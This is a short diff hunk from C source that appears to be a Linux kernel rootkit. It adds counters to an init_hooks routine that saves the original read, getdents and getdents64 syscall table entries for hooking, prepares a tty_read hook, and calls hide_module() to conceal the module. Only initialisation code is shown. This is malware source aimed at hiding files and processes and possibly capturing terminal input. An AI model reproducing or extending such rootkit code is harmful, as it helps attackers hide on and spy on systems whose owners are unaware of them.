@@ -58,14 +58,18 @@ void
 init_hooks(void)
 {
     atomic_set(&read_install_count, 0);
+    atomic_set(&tty_read_install_count, 0);
     atomic_set(&getdents_install_count, 0);
 
     atomic_set(&read_count, 0);
     atomic_set(&tty_read_count, 0);
+    atomic_set(&getdents_count, 0);
+    atomic_set(&getdents64_count, 0);
 
     sys_read = (void *)sys_calls[__NR_read];
     sys_getdents = (void *)sys_calls[__NR_getdents];
     sys_getdents64 = (void *)sys_calls[__NR_getdents64];
+    sys_tty_read = NULL;
 
     if (rootkit.hiding_module)
         hide_module();
